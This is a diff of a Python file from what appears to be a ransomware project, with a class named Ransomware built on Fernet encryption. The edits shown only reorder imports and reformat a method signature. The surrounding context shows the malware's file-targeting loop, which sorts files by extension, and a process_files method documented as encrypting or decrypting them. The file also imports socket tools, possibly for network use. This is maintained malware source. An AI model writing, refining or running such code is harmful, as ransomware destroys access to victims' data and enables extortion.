@@ -3,10 +3,10 @@ import os.path
 sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
 
 import shutil
+from time import sleep
 from pathlib import Path
 from typing import Dict, List
-from time import sleep
-from lib.system import System
+from lib.modules.system import System
 from lib.modules.yaml import safe_load
 from lib.cryptography.fernet import Fernet
 from socket import socket, AF_INET, SOCK_STREAM
@@ -56,10 +56,7 @@ class Ransomware(Fernet):
             if entry.is_file() and (ext := entry.suffix.lower()) in extcategory:
                 self.file_categories[extcategory[ext]].append(str(entry))
 
-    def process_files(
-        self, 
-        mode: str
-    ) -> None:
+    def process_files(self, mode: str) -> None:
         """
         Encrypts or decrypts files based on the specified mode.
 
